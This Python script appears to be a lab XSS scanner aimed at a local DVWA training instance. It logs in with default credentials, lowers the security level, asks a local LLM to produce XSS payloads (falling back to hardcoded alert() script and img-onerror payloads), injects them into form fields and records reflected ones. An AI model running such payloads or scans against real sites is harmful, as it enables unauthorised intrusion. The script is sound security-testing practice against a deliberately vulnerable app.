import requests
from bs4 import BeautifulSoup
import json
from urllib.parse import urljoin

BASE_URL = "http://localhost:8080/"
LOGIN_URL = urljoin(BASE_URL, "login.php")

session = requests.Session()


# ---------------- GENERATE PAYLOADS (OLLAMA) ----------------
def generate_payloads():

    print("[+] Generating XSS payloads using Ollama...")

    try:
        response = requests.post(
            "http://localhost:11434/api/generate",
            json={
                "model": "qwen3.5:397b-cloud",
                "prompt": "Generate 10 unique XSS payloads. Only return payloads line by line. No explanation.",
                "stream": False
            }
        )

        text = response.json()["response"]

        payloads = []

        for line in text.split("\n"):
            line = line.strip()

            # remove numbering like "1. payload"
            if line:
                if ". " in line:
                    line = line.split(". ", 1)[-1]

                if not line.lower().startswith(("here", "sure")):
                    payloads.append(line)

        print("[+] Payloads generated")

        return payloads

    except Exception as e:
        print("[-] Ollama failed:", e)

        return [
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>"
        ]


# ---------------- LOGIN ----------------
def login():

    login_page = session.get(LOGIN_URL)
    soup = BeautifulSoup(login_page.text, "html.parser")

    token = soup.find("input", {"name": "user_token"})
    token_value = token["value"] if token else None

    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login"
    }

    if token_value:
        login_data["user_token"] = token_value

    response = session.post(LOGIN_URL, data=login_data)

    if response.status_code == 200:
        print("[+] Login successful")
        session.cookies.set("security", "low")
        print("[+] Security level set to LOW")
    else:
        print("[-] Login failed")
        exit()


# ---------------- LOAD FORMS ----------------
def load_forms():
    with open("forms.json", "r") as f:
        return json.load(f)


# ---------------- TEST FORMS ----------------
def test_forms():

    forms = load_forms()
    payloads = generate_payloads()

    vulnerabilities = []

    for form in forms:

        url = form["page"]

        # only test DVWA vulnerability pages
        if "vulnerabilities" not in url:
            continue

        action = form["action"]
        method = form["method"]

        if action.endswith("#") or action == BASE_URL:
            action = url

        print(f"\nTesting: {url}")

        for input_field in form["inputs"]:

            if input_field["type"] not in ["text", "hidden", "password", "textarea"]:
                continue

            name = input_field["name"]

            if not name:
                continue

            for payload in payloads:

                data = {}

                for inp in form["inputs"]:
                    data[inp["name"]] = inp.get("value", "")

                data[name] = payload

                try:

                    if method.lower() == "post":
                        response = session.post(action, data=data)
                    else:
                        response = session.get(action, params=data)

                    print(f"Testing payload: {payload[:30]}...")

                    if payload in response.text:

                        vuln = {
                            "url": url,
                            "form_action": action,
                            "method": method,
                            "vulnerable_input": name,
                            "payload": payload,
                            "type": "XSS (LLM Generated)",
                            "remediation": "Use output encoding and input validation."
                        }

                        vulnerabilities.append(vuln)

                        print(f"[!] XSS Found: {name}")

                        break   # stop after first working payload

                except Exception as e:
                    print("Error:", e)

    with open("xss_vulnerabilities_llm.json", "w") as f:
        json.dump(vulnerabilities, f, indent=4)

    print("\nScan complete. Results saved to xss_vulnerabilities_llm.json")


# ---------------- MAIN ----------------
if __name__ == "__main__":
    login()
    test_forms()